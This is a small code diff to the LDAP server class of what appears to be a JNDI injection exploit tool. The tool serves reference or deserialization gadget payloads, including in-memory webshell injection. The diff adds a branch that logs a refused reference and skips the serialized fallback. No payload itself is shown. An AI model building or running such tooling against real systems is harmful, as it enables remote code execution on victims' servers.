@@ -24,6 +24,8 @@ import java.net.InetAddress;
 import java.net.URL;
 import java.util.Enumeration;
 
+import com.bloom.exploit.RefFactory;
+
 import com.bloom.exploit.chain.ChainDispatcher;
 import static com.bloom.util.Functions.getRandomString;
 import static com.bloom.util.Functions.ipCheck;
@@ -110,6 +112,10 @@ public class LdapServer extends InMemoryOperationInterceptor {
                 if (ref != null) {
                     writeReferenceAttributes(e, ref);
                     payloadResult = "ref:" + route.getPayloadType();
+                } else if (!config.forceSerialize && RefFactory.supports(route.getPayloadType())) {
+                    // RefFactory 支持但拒绝生成（如 ELjakarta 内存马注入），已明确报错，
+                    // 不回退序列化路径产出废 payload
+                    System.out.println("Reference 生成被拒绝: " + route.getPayloadType());
                 } else {
                     String s = ChainDispatcher.generate(route);
                     try {
